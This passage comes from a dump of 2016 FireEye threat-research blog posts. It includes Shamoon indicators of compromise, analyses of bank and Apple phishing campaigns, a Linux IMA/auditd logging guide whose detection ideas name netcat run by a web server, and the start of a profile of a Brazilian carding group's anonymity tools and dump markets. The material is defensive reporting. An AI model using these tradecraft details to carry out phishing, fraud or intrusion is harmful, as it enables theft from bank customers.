 <ul> <li>Monitor any events in the SIEM that show dates in August
  2012.</li> <li>Monitor for system time change events that set the
    clock back to and from August 2012.</li> <li>Monitor for Remote
    Registry service starts.</li> <li>Monitor for changes to the
    aforementioned registry key value, if the value is currently
  non-zero.</li> <li>Prevent and limit access to the aforementioned
    shares, which could have significant impact based on setup.</li>
    <li>Prevent client-to-client communication to slow down the spread
    of the malware, which could also have a significant impact based on
  setup.</li> <li>Monitor filesystems for the creation of any of the
    filenames provided in the Indicators of Compromise list at the
    bottom of the post.</li> <li>Change the credentials of all
    privileged accounts and ensure local Administrator passwords are
    unique per system.</li> </ul>
 <h4>Indicators of Compromise</h4>
 <p>The following is a set of the Indicators of Compromise for the
  identified Shamoon variant. We recommend that critical infrastructure
  organizations and government agencies (especially those in the Gulf
  Cooperation Council region) check immediately for the presence or
  execution of these files within their Windows Server and Workstation
  environments. Additionally, we recommend that all customers continue
  to regularly review and test disaster recovery plans for critical
  systems within their environment.</p>
 <p>File name: ntssrvr64.exe<br /> Path: %SYSTEMROOT%\System32<br />
  Compile Time: 2009/02/15 12:32:19<br /> File size:717,312</p>
 <p>File name: ntssrvr32.exe<br /> Path: %SYSTEMROOT%\System32 NA
  NA<br /> File size: 1,349,632</p>
 <p>File name: ntssrvr32.bat<br /> Path: %SYSTEMROOT%\System32 NA<br />
  MD5: 10de241bb7028788a8f278e27a4e335f<br /> File size: 160</p>
 <p>File name: gpget.exe<br /> Path: %SYSTEMROOT%\System32<br /> PE
  compile time: 2009/02/15 12:30:41<br /> MD5:
  c843046e54b755ec63ccb09d0a689674<br /> File Size: 327,680</p>
 <p>File name: drdisk.sys<br /> Path:
  %SYSTEMROOT%\System32\Drivers<br /> Compile time: 2011/12/28
  16:51:29<br /> MD5: 76c643ab29d497317085e5db8c799960<br /> File Size: 31,632</p>
 <p>File name: key8854321.pub<br /> Path: %SYSTEMROOT%\System32<br />
  MD5: b5d2a4d8ba015f3e89ade820c5840639 782</p>
 <p>File name: netinit.exe<br /> Path: %SYSTEMROOT%\System32<br /> MD5:
  ac4d91e919a3ef210a59acab0dbb9ab5<br /> File Size: 183,808<br />
  Service Details<br /> Display name: &quot;Microsoft Network Realtime
  Inspection Service&quot;<br /> Service name: &quot;NtsSrv&quot;</p>
 <p>Description: &quot;Helps guard against time change attempts
  targeting known and newly discovered vulnerabilities in network time
  protocols&quot;<br /> Files created:</p>
 <ul> <li>%WINDIR%\inf\usbvideo324.pnf</li>
  <li>%WINDIR%\system32\netinit.exe</li> </ul>
 <h4>Dynamic Analysis Observables</h4>
 <p>RegistryItem HKLM\SYSTEM\CurrentControlSet\Services\NtsSrv\</p>
 <p>RegistryItem HKLM\SYSTEM\ControlSet001\Services\NtsSrv\</p>
 <p>RegistryItem HKLM\SYSTEM\CurrentControlSet\Services\wow32\</p>
 <p>RegistryItem HKLM\SYSTEM\ControlSet001\Services\wow32\</p>
 <p>RegistryItem HKLM\SYSTEM\CurrentControlSet\Services\drdisk\</p>
 <p>RegistryItem HKLM\SYSTEM\ControlSet001\Services\drdisk\</p>
 <p>FileItem C:\Windows\System32\caclsrv.exe</p>
 <p>FileItem C:\Windows\System32\certutl.exe</p>
 <p>FileItem C:\Windows\System32\clean.exe</p>
 <p>FileItem C:\Windows\System32\ctrl.exe</p>
 <p>FileItem C:\Windows\System32\dfrag.exe</p>
 <p>FileItem C:\Windows\System32\dnslookup.exe</p>
 <p>FileItem C:\Windows\System32\dvdquery.exe</p>
 <p>FileItem C:\Windows\System32\event.exe</p>
 <p>FileItem C:\Windows\System32\extract.exe</p>
 <p>FileItem C:\Windows\System32\findfile.exe</p>
 <p>FileItem C:\Windows\System32\fsutl.exe</p>
 <p>FileItem C:\Windows\System32\gpget.exe</p>
 <p>FileItem C:\Windows\System32\iissrv.exe</p>
 <p>FileItem C:\Windows\System32\ipsecure.exe</p>
 <p>FileItem C:\Windows\System32\msinit.exe</p>
 <p>FileItem C:\Windows\System32\netx.exe</p>
 <p>FileItem C:\Windows\System32\ntdsutl.exe</p>
 <p>FileItem C:\Windows\System32\ntfrsutil.exe</p>
 <p>FileItem C:\Windows\System32\ntnw.exe</p>
 <p>FileItem C:\Windows\System32\power.exe</p>
 <p>FileItem C:\Windows\System32\rdsadmin.exe</p>
 <p>FileItem C:\Windows\System32\regsys.exe</p>
 <p>FileItem C:\Windows\System32\routeman.exe</p>
 <p>FileItem C:\Windows\System32\rrasrv.exe</p>
 <p>FileItem C:\Windows\System32\sacses.exe</p>
 <p>FileItem C:\Windows\System32\sfmsc.exe</p>
 <p>FileItem C:\Windows\System32\sigver.exe</p>
 <p>FileItem C:\Windows\System32\smbinit.exe</p>
 <p>FileItem C:\Windows\System32\wcscript.exe</p>",http://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html
"‘One-Stop Shop’ – Phishing Domain Targets Information from Customers of
Several Indian Banks","<p>FireEye Labs recently discovered a malicious phishing domain designed
  to steal a variety of information – including credentials and mobile
  numbers – from customers of several banks in India. Currently, we have
  not observed this domain being used in any campaigns. The phishing
  websites appear to be in the earlier stages of development and through
  this post we hope users will be able to identify these types of
  emerging threats in the future.</p>
 <p>FireEye <a href=""https://www.fireeye.com/content/fireeye-www/en_US/products/ex-email-security-products.html"">phishing
    detection technology</a> identified a newly registered domain,
  “csecurepay[.]com”, that was registered on Oct. 23, 2016. The website
  purports to offer online payment gateway services, but is actually a
  phishing website that leads to the capturing of victim logon
  credentials – and other information – for multiple banks operating in India.</p>
 <p>Prior to publication, FireEye notified the Indian Computer Emergency
  Response Team.</p>
 <h3>Phishing Template Presentation and Techniques</h3>
 <h4>Step 1</h4>
 <p>URL: hxxp://csecurepay[.]com/load-cash-step2.aspx</p>
 <p>When navigating to the URL, the domain appears to be a payment
  gateway and requests that the user enter their bank account number and
  the amount to be transferred, as seen in Figure 1. The victim is
  allowed to choose their bank from a list that is provided.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Bank information being requested</span></p>
 <p>By looking at the list, it is clear that only Indian banks are being
  targeted at this time. A total of 26 banks are available and these are
  named in the Appendix.</p>
 <h4>Step 2</h4>
 <p>URL:  hxxp://csecurepay[.]com/PaymentConfirmation.aspx</p>
 <p>The next website requests the victim to enter their valid 10-digit
  mobile number and email ID (Figure 2), which makes the website appear
  more legitimate.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Personal information being requested</span></p>
 <h4>Step 3</h4>
 <p>The victim will then be redirected to the spoofed online banking
  page of the bank they selected, which requests that they log in using
  their user name and password. Figure 3 shows a fake login page for
  State Bank of India. See the Appendix for more banks that have spoofed
  login pages.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Fake login page for State Bank of India</span></p>
 <p>After entering their login credentials, the victim will be asked to
  key in their One Time Password (OTP), as seen in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: OTP being requested</span></p>
 <h4>Step 4</h4>
 <p>URL: hxxp://csecurepay[.]com/Final.aspx</p>
 <p>Once all of the sensitive data is gathered, a fake failed login
  message will be displayed to the victim, as seen in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Fake error message being displayed</span></p>
 <h4>Credit and Debit Card Phishing Website</h4>
 <p>Using the registrant information from the csecurepay domain, we
  found another domain registered by the phisher as “nsecurepay[.]com”.
  The domain, registered in latest August 2016, aims to steal credit and
  debit card information.</p>
 <p>The following are among the list of cards that are targeted:</p>
 <p>1.     ICICI Credit Card</p>
 <p>2.     ICICI Debit Card</p>
 <p>3.     Visa/Master Credit Card</p>
 <p>4.     Visa/Master Debit Card</p>
 <p>5.     SBI Debit Card Only</p>
 <p>At the time of this writing, the nsecurepay website was producing
  errors when redirecting to spoofed credit and debit card pages. Figure
  6 shows the front end.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Nsecurepay front end</span></p>
 <h3>Conclusion</h3>
 <p>Phishing has its own development lifecycle. It usually starts off
  with building the tools and developing the “hooks” for luring victims
  into providing their financial information. Once the phishing website
  (or websites) is fully operational, we typically begin to see a wave
  of phishing emails pointing to it.</p>
 <p>In this case, we see that phishing websites have been crafted to
  spoof multiple banks in India. These attackers can potentially grab
  sensitive online banking information and other personal data, and even
  provided support for multifactor authentication and OTP. Moreover,
  disguising the initial presentation to appear as an online payment
  gateway service makes the phishing attack seem more legitimate.</p>
 <p>FireEye Labs detects this phishing attack and customers will be
  protected against the usage of these sites in possible future campaigns.</p>
 <h3>Appendix</h3>
 <p>Fake login pages were served for 26 banks. The following is a list
  of some of the banks:</p>
 <p>-Bank of Baroda - Corporate</p>
 <p>-Bank of Baroda - Retail</p>
 <p>-Bank of Maharashtra</p>
 <p>-HDFC Bank</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: HDFC Bank fake login page</span></p>
 <p>-ICICI Bank</p>
 <p>-IDBI Bank</p>
 <p>-Indian Bank</p>
 <p>-IndusInd Bank</p>
 <p>-Jammu and Kashmir Bank</p>
 <p>-Kotak Bank</p>
 <p>-Lakshmi Vilas Bank - Corporate</p>
 <p>-Lakshmi Vilas Bank - Retail</p>
 <p>-State Bank of Hyderabad</p>
 <p>-State Bank of India</p>
 <p>-State Bank of Jaipur</p>
 <p>-State Bank of Mysore</p>
 <p>-State Bank of Patiala</p>
 <p>-State Bank of Bikaner</p>
 <p>-State Bank of Travancore</p>
 <p>-Tamilnad Mercantile Bank</p>
 <p>-United Bank of India</p>",http://www.fireeye.com/blog/threat-research/2016/11/one-stop-shop-phishing-domain.html
"FireEye Cyber Defense Summit 2016: The Incident Response Track –
Technical Details and Solutions that Work","<p>
  <img class=""float-left"" src=""https://www.fireeye.com/content/dam/fireeye-www/company/events/images/mircon-cyber-defense-summit-2016.jpg"" />2016 has been a year of significant change to the
  cyber security landscape. The rapid proliferation of ransomware and
  the emergence of Internet of Things mass compromise has changed the
  landscape for responders. Similarly, existing threats have become more
  brazen, with nation-state actors publishing the results of their
  campaigns publicly and financial threat actors leaving no piece of PII behind.</p>
 <p>While the average global identification time for compromise by
  advanced attackers has continued to decrease from 206 days in 2014 to
  146 days in 2015, it’s still unacceptably long to protect the data
  that matters for an organization. As an incident responder at Mandiant
  for the past four years, I have personally worked on cases in 2016
  where attackers were able to break into an organization and complete
  their mission in record time.</p>
 <p>Skilled and trained incident responders with access to the latest
  information on threats, adversaries and tools are one of the best
  lines of defense in keeping an environment secure and terminating a
  threat as it happens. With that in mind, for the FireEye Cyber Defense
  Summit 2016 Incident Response track, I sought to cultivate a group of
  practitioners who could share their experiences, research and
  successes with the greater incident response community.</p>",http://www.fireeye.com/blog/threat-research/2016/11/fireeye-cyber-defense.html
Extending Linux Executable Logging With The Integrity Measurement Architecture,"<p>Gaining insight into the files being executed on your system is a
  great first step towards improved visibility on your endpoints. Taking
  this a step further, centrally storing logs of file execution data so
  they can be used for detection and hunting provides an excellent
  opportunity to find evil on your network.</p>
 <p>A SIEM, and to some degree your entire security monitoring program,
  is only as good as the data you are collecting. Process execution data
  is incredibly valuable for enabling a multitude of detection and
  hunting scenarios, which means it’s something you should consider
  collecting and storing. Customers of our <a href=""https://www.fireeye.com/content/fireeye-www/en_US/products/threat-analytics-platform.html"" target=""_blank"">Threat Analytics Platform</a> (TAP) cloud-based SIEM
  solution frequently ask us about tools that can help them collect this
  type of file execution data. For Windows systems, our detection team
  typically recommends the <a href=""https://technet.microsoft.com/en-us/sysinternals/sysmon"">Sysinternals
    Sysmon tool</a> since it provides excellent visibility into the type
  of files that are being executed on your Windows machines and both
  integrates and scales well when properly deployed.</p>
 <p>In this post, I’m going to talk about a lesser-known feature of the
  Linux architecture called the Integrity Measurement Architecture
  (IMA). When coupled with auditd, IMA will allow you to achieve on
  Linux hosts a similar executable logging capability as the Sysmon tool
  for Windows.</p>
 <p>The Integrity Measurement Architecture is a component of the Linux
  kernel’s integrity subsystem. For this post, we’re going to focus on a
  minimum baseline configuration and policy in order to get file
  execution logs into a format that can be ingested by your SIEM. File
  execution logs are available in various forms and locations in Linux,
  but the logs we will be generating contain a wealth of data in one
  location that would otherwise need to be gathered from several
  disparate sources or may have not have been available at all.</p>
 <p>First, you should familiarize yourself with documentation for your
  Linux distribution to verify whether the IMA kernel compilation
  options are enabled by default. The IMA subsystem has been part of the
  mainline kernel since version 2.6.30, but not every distribution
  compiles their kernel with these options enabled. All of the examples
  in this post were tested on Ubuntu 16.04.1 LTS, as the IMA kernel
  options are enabled by default in this distribution.</p>
 <p>Instructions for compiling a kernel with these options enabled are
  listed in this <a href=""https://sourceforge.net/p/linux-ima/wiki/Home/"">Integrity
    Measurement Architecture documentation</a>. Documentation for auditd
  can be found <a href=""https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Security_Guide/chap-system_auditing.html"">here</a>.
  The reason we need the auditd daemon is because it is the userspace
  component for Linux’s auditing platform and it is responsible for
  writing all the resulting audit records to disk. Without auditd, the
  logs for the events we will be generating would never get written out
  to disk.</p>
 <p>The <a href=""https://sourceforge.net/p/linux-ima/wiki/Home/"">stated
  goals</a> of the IMA subsystem are “to detect if files have been
  accidentally or maliciously altered, both remotely and locally,
  appraise a file’s measurement against a ‘good’ value stored as an
  extended attribute, and enforce local file integrity.” To achieve
  these goals, IMA provides several functions, including:</p>
 <ul> <li>
    <b>Collect</b> – “measure” a file before it is accessed. The term
    measurement in this context means to grab a hash of the file data,
    the hash of some file metadata and the file path, and then store
    this data in a runtime measurement list.</li> <li>
    <b>Store</b> – add the measurement to a kernel resident list and, if
    a hardware Trusted Platform Module (TPM) is present, extend the IMA
    Platform Configuration Register (PCR). TPM and PCR are part of an
    international standard for dedicated microcontrollers intended to
    secure hardware.</li> <li>
    <b>Attest</b> – if present, use the TPM to sign the IMA PCR value to
    allow a remote validation of the measurement list.</li> <li>
    <b>Appraise</b> – enforce local validation of a measurement against
    a “good” value stored in an extended attribute of the file.</li> <li>
    <b>Protect</b> – protect a file’s security extended attributes
    (including appraisal hash) against off-line attack.</li> </ul>
 <h5>Collect &amp; Store</h5>
 <p>Part of the way the appraisal function validates a file is to
  calculate a hash value, which just determines how mathematically
  unique the file is, and compare this value against a stored “good”
  hash value. The specific hash function that IMA uses is a configurable option.</p>
 <h5>Attest</h5>
 <p>This is effective for locally ensuring integrity of an environment,
  but what if we also wanted to compare these measured hash values
  against a list of known bad file hashes through an external or
  internal blacklist? It could also be the case that runtime integrity
  checking on every machine isn’t suitable for your environment.
  Generating and storing these logs opens up the possibility for future
  investigation as well as centralized detection capabilities if your
  organization is ingesting these logs into a single repository.</p>
 <h5>Appraise</h5>
 <p>We can utilize the auditing function of IMA to generate a log every
  time IMA measures an executable. When an IMA policy is set to
  <b>audit</b> any executable and auditd is running, a log will be
  written containing metadata for each executable.</p>
 <p>The simplest IMA policy we can write to log all executables looks
  like this:</p>
 <p>
  <span class=""code"">audit func=BPRM_CHECK mask=MAY_EXEC</span></p>
 <p>There are several ways to apply this policy to IMA that are detailed
  in the IMA documentation. Later versions of systemd will apply a
  custom policy located in “/etc/ima/ima-policy”. Placing the single
  line policy set forth above in this file will cause systemd to apply
  this IMA policy to the system. This version of systemd was included in
  Ubuntu 16.04.1.</p>
 <p>It should be noted that the example policy is extremely broad and
  will result in a high volume of logs being generated, primarily by
  daemons – equivalent to a Windows service - performing routine tasks,
  such as systemd. The policy can be further restricted by file magic
  values, UID, filesystem mask values and several others, as specified
  by the <a href=""https://www.kernel.org/doc/Documentation/ABI/testing/ima_policy"">policy documentation</a>.</p>
 <p>This policy will produce audit INTEGRITY_RULE logs that look like this:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/extending%20linux%20executables%20alek%20rollyson/integrityrulelogfig1.png"" /></p>
 <p>This gives us several great pieces of information for searching and
  correlation in a SIEM: the path of the file that was executed
  (kaiten.bin) and the path of its parent (/bin/bash), the PID(8205) and
  parent PID(1943) of the executable, the SHA-1 hash
  value(48a3171d8f04c09f6d06362d4c4b995eaa97d489) of this file (or
  whatever hash value you configured IMA to use), and the UID, GID,
  etc., of the user that owned the process. A quick check in VirusTotal
  of the hash supplied to us by IMA in this example shows that this is a
    <a href=""https://www.virustotal.com/en/file/dc7ab9fb890cce80e29be85b25d974f430606a962dcffd032fedccb63dcf2e1b/analysis/"">variant
    of the Kaiten IoT bot</a>.</p>
 <p>Once you are generating logs with IMA and auditd, you can send them
  to your SIEM using your normal log ingestion process via something
  like syslog.</p>
 <p>Now that you’re ingesting these logs into your SIEM, there are all
  sorts of detection and hunting scenarios available:</p>
 <ul> <li>Using rules and ingestion decoration services (services that
    add additional metadata to a log at ingestion time) to check hashes
    against internal and or external blacklists. For example:</li> </ul>
 <p>            o   VirusTotal<br />             o   Lists of hashes
  seen in public Linux honeypots<br />             o   Lists of samples
  seen in previous incidents</p>
 <ul> <li>Inspecting the path of the executable for abnormalities. For
  example:</li> </ul>
 <p>            o   Binaries named as system utilities executing from
  unusual locations (/opt/app/sudo, /home/foo/su)<br />             o  
  Paths you wouldn’t expect to see with executable files (Executables in
  your web app’s image upload directory<br />             o   Binaries
  executing from hidden directories (/opt/.hidden/foo, /home/user/.hidden/bar)</p>
 <ul> <li>Checking specific UIDs and GIDs for unusual execution. For
  example:</li> </ul>
 <p>            o   Web app user account attempting to use unusual
  utilities (top, netstat, su, etc.)<br />             o   An account
  under an archive service group attempting to execute something out of /tmp</p>
 <ul> <li>Checking specific parent executables and processes for unusual
    execution. For example:</li> </ul>
 <p>            o   Communication broker executing directory traversal
  commands<br />             o   Apache process executing netcat</p>
 <p>Configuration options for both IMA and auditd are extensive so, if
  this post is of interest to your organization, I highly recommend
  reading the documentation for both IMA and auditd so they can be
  further customized to your needs. This post isn’t meant to be an
  all-inclusive guide to IMA, but our hope is that it introduces you to
  this capability so that you can dive in and make it useful for
  improving your visibility into Linux process execution and aid you in
  finding more evil in your network.</p>",http://www.fireeye.com/blog/threat-research/2016/11/extending_linux_exec.html
2016 Flare-On Challenge Solutions,"<p>I would like to thank the challenge authors this year:</p>
 <ol> <li>Alexander Rich</li> <li>Matt Williams (@0xmwilliams)</li>
    <li>Dominik Weber</li> <li>James T. Bennett (@jtbennettjr)</li>
    <li>Tyler Dean</li> <li>Josh Homan</li> <li>Alex Berry</li> <li>Nick
    Harbour (@nickharbour)</li> <li>Jon Erickson (@2130706433)</li>
    <li>FireEye Labs Advanced Vulnerability Analysis Team (FLAVA)</li> </ol>
 <p>The most noticeable change this year in the Flare-On format was a
  welcomed move away from the email backend system to an interactive
  framework based on CTFd. As a result of this change, we have much
  improved metrics on active players and solutions, and for the first
  time in Flare-On challenge history: 100 percent uptime. Let’s look at
  how the challenge went.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare-On%203%20Solutions/image2.png"" /></p>
 <p>By all accounts this was the hardest Flare-On challenge yet, with
  Challenge 10 holding the dubious title of hardest challenge in
  Flare-On history and hopefully keeping that title for all time. This
  year’s first challenge was also significantly more difficult than last
  year’s first challenge, which was a simple single-byte XOR loop. As a
  result of this increase in difficulty, the number of people who solved
  the first challenge dropped by more than 40 percent from last year.</p>
 <p>The international appeal of the Flare-On challenge was as strong as
  ever this year, with less than 14 percent of finishers coming from the
  United States. Outside of the U.S., Vietnam saw the most finishers
  with 13, a Flare-On international record, and Singapore more than
  doubled its finishers from last year, putting them at a solid 9
  finishers. A total of 38 countries were represented in the finishers
  this year, up from 33 last year. Congratulations all around!</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare-On%203%20Solutions/image3.png"" /></p>
 <p>All the binaries from this year’s challenge are now posted on <a href=""http://flare-on.com/files/Flare-On3_Challenges.zip"">flare-on.com</a>.
  And here are the solutions written by each challenge author:</p>
 <ol> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge1-solution.pdf"">SOLUTION
  1</a></li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge2-solution.pdf"">SOLUTION
  2</a></li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge3-solution.pdf"">SOLUTION
  3</a></li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge4-solution.pdf"">SOLUTION
  4</a></li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge5-solution.pdf"">SOLUTION
  5</a></li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge6-solution.pdf"">SOLUTION
  6</a></li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge7-solution.pdf"">SOLUTION
  7</a></li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge8-solution.pdf"">SOLUTION
  8</a></li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge9-solution.pdf"">SOLUTION
  9</a></li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/flareon2016/challenge10-solution.pdf"">SOLUTION
  10</a></li> </ol>",http://www.fireeye.com/blog/threat-research/2016/11/2016_flare-on_challe.html
Rotten Apples: Resurgence,"<p>In June 2016, we published a <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/06/rotten_apples_apple.html"" target=""_blank"">blog about a phishing campaign</a> targeting the
  Apple IDs and passwords of Chinese Apple users that emerged in the
  first quarter of 2016 (referred to as the “Zycode” phishing campaign).
  At FireEye Labs we have an automated system designed to proactively
  detect newly registered malicious domains and this system had observed
  some phishing domains that were designed to appear as legitimate Apple
  domains. Most of the domains reported by this system were suspended in
  June 2016, which resulted in a loss of momentum for the Zycode
  phishing campaign. Throughout the second quarter of 2016, the Zycode
  phishing campaign was in hibernation.</p>
 <p>We recently observed a resurgence of the same phishing campaign when
  our systems detected roughly 90 phony Apple-like domains that were
  registered from July 2016 to September 2016. Once again, Chinese Apple
  users are being targeted for their Apple IDs and passwords using the
  same content reported on in our earlier blog. The majority of these
  domains are registered in the .com TLD by email accounts from
  qq[.]com, and the IPs of these domains point to mainland China, as
  seen in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Google map showing the location of the
    hosted phishing domains</span></p>
 <h5>What has not Changed?<br /> </h5>
 <p>The attackers have not changed the content of the phishing sites.
  The obfuscated JavaScript used in the earlier version is once again
  being used here in this campaign. We have provided the details of
  JavaScript and screenshots of interaction with the website in our <a href=""https://www.fireeye.com/blog/threat-research/2016/06/rotten_apples_apple.html"">earlier blog</a>.</p>
 <h5>What has Changed?</h5>
 <p>Apparently the domains and email addresses used in previous version
  of the campaign were effectively taken down. Now the attackers have
  moved to a new malicious infrastructure; new domains, IPs and email
  addresses are being used for this campaign. The new domain names for
  the campaign are listed in Table 1, while their IPs and registrant
  emails are reported in Table 2 and Table 3, respectively.</p>
 <h5>
  <b>Domains List</b></h5>
 <h5>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab1.png"" /></h5>
 <p>
  <span class=""type-XS"">Table 1: Apple phishing domains serving the
    Zycode phishing kit.</span></p>
 <h5>Unique IP(s)<br /> </h5>
 <p>Table 2 shows the list of unique IPs, which are not the same as what
  was seen before.<br /> </p>
 <h1>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab2.png"" /></h1>
 <p>
  <span class=""type-XS"">Table 2. IP addresses used by the domains.</span></p>
 <h5>Unique Email Addresses<br /> </h5>
 <p>The email addresses used to register these domains, showing no
  similarity with email addresses in the previous campaign, are shown in
  Table 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab3.png"" /></p>
 <p>
  <span class=""type-XS"">Table 3. List of unique registrant emails.</span>
  <br /> </p>
 <h5>Unique Registrants<br /> </h5>
 <p>Table 4 shows the registrant names, which have no similarity with
  the previous registrant name information.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab4.png"" /></p>
 <p>
  <span class=""type-XS"">Table 4. List of registrant names used by the
    phishing domains.</span>
  <br /> </p>
 <h5>How to Avoid Being a Victim</h5>
 <p>Apple provides information on phishing <a href=""http://www.apple.com/legal/more-resources/phishing/"">here</a>
  and <a href=""https://support.apple.com/en-us/HT204759"">here</a>, and
  on iCloud security <a href=""https://support.apple.com/en-us/HT203126"">here</a>. There are
  simple ways for a user to be more secure against this and similar
  attacks. The following are a few tips:</p>
 <ul> <li>Enable <a href=""https://support.apple.com/en-us/HT204915"">two-factor
      authentication for Apple ID</a>.</li> <li>Always check the address
    bar for the correct web address.</li> <li>Avoid clicking links in
    emails and SMS messages that supposedly direct to iCloud pages.</li>
    <li>Use our <a href=""https://www.fireeye.com/content/fireeye-www/en_US/products/ex-email-security-products.html#content-par_grid_66_33_full_c718"" target=""_blank"">FireEye EX appliance</a>, which provides effective
    detection for the Zycode phishing campaign.</li> </ul>",http://www.fireeye.com/blog/threat-research/2016/10/rotten_apples_resur.html
Operations of a Brazilian Payment Card Fraud Group,"<h4>Introduction</h4>
 <p>Brazil has been designated a major hub for financially motivated
  eCrime threat activity. Brazilian threat actors are targeting domestic
  and foreign entities and individuals, with frequent targeting of U.S.
  assets. The country routinely places in &quot;Top Five&quot; lists of
  various global cyber crime rankings, and multiple sources claim that
  financially motivated threat activity in the country has increased
  within the past few years.</p>
 <p>In this blog we provide insight into the tactics, techniques and
  procedures (TTPs) of a Brazilian cyber crime group that specializes in
  payment card fraud operations. The threat actors, observed by FireEye
  Labs, use a variety of different methods to either compromise or
  acquire already compromised payment card credentials, including
  sharing or purchasing dumps online, hacking vulnerable merchant
  websites and compromising payment card processing devices. Once in
  their possession, the actors use these compromised payment card
  credentials to generate further card information. The main methods
  used by the observed group to launder and monetize illicit funds
  include online purchases of various goods and services as well as ATM withdrawals.</p>
 <p>Based on extensive observation of this group's activity, we are able
  to characterize their operations lifecycle starting with the initial
  operational setup; followed by the methods used to compromise
  credentials or, conversely, purchase already compromised credentials;
  then the process of generating new cards for subsequent abuse, which
  includes validation and cloning; and finally the subsequent
  monetization strategies. Figure 1 depicts this operation workflow.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Brazilian carding operation workflow</span></p>
 <h4>Phase 1: Setting Up the Workplace</h4>
 <p>We observed this group taking several preparatory measures to
  maintain anonymity.</p>
 <p>The members of the group use a variety of tools, including CCleaner,
  on a daily basis to effectively remove any evidence of their
  operations. This includes browsing history, temporary files,
  Clipboard, typed URLs, cookies, recently opened documents, and
  conversations via Skype, Windows Messenger, etc. This almost certainly
  limits the potential amount of evidence that law enforcement could
  obtain and use against the suspects in the case of an arrest or
  property search.</p>
 <p>Another common step taken by threat actors is changing their
  system's MAC Address to avoid being uniquely identified. For this
  purpose, these actors often use tools such as Technitium MAC Address Changer.</p>
 <p>We have observed these actors using Tor or proxy-based tools similar
  to Tor (e.g., UltraSurf, as seen in Figure 2). We have also observed
  them using virtual private network services that use IPs based in
  numerous countries to ensure anonymity and obfuscate criminal operations.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Brazilian%20Carding%20Taha%20Karim/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Ultra Surf 12.10</span></p>
 <p>Additionally, many actors conduct transactions using virtual
  currencies, most prominently Bitcoin, to anonymize criminal
  transactions. Due to the comparative anonymity and lack of government
  oversight often associated with the use of virtual currencies, virtual
  currency is of significant value for actors involved in illicit
  operations when they are performing transactions among themselves.</p>
 <h4>Phase 2: Data Acquisition</h4>
 <p>Based on our observations, this group uses a variety of different
  methods to either compromise or acquire already compromised payment
  card credentials.</p>
 <p>Payment card &quot;dumps&quot; are commonly shared amongst Brazilian
  threat actors via social media forums such as Facebook, Skype, and
  web-based WhatsApp messenger. These social media circles are highly
  prevalent amongst these regional actors and are often the preferred
  method of communication. This group takes advantage of those
  communities to obtain stolen data from peers. Similarly, the group
  takes advantage of freely available consolidations of email
  credentials, personal information, and other data shared in eCrime
  forums for fraud purposes.</p>
 <p>The group systematically purchases payment card data via different
  online shops. These shops include &quot;Toy Store,&quot; &quot;Joker's
  Stash,&quot; and &quot;Cvv2finder.&quot; The venues, called &quot;dump
